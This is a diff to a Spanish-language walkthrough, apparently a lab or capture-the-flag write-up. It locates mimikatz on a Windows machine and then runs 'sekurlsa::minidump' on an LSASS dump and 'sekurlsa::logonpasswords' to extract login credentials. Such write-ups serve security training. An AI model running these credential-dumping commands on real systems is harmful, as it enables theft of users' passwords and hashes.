@@ -386,7 +386,20 @@ Primero averiguamos si existe el programa:
 ```cmd
 powershell -Command "Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *mimikatz*.exe | Select-Object FullName"
 ```
+<img width="1031" height="208" alt="imagen" src="https://github.com/user-attachments/assets/06310738-ebd1-4600-9dfc-e8d621dc5e3d" />
 
+Obenemos las siguientes direcciones:
+- C:\Tools\Mimikatz\Win32\mimikatz.exe
+- C:\Tools\Mimikatz\x64\mimikatz.exe
+
+
+
+Ejecutamos el programa bajo el comando:
+```cmd
+C:\Tools\Mimikatz\Win32\mimikatz.exe
+```
+
+Utilizaremos los comandos `log`, luego `sekurlsa::minidump C:\Users\jordan\lsass.dmp` y finalmente `sekurlsa::logonpasswords`:
 
 
 
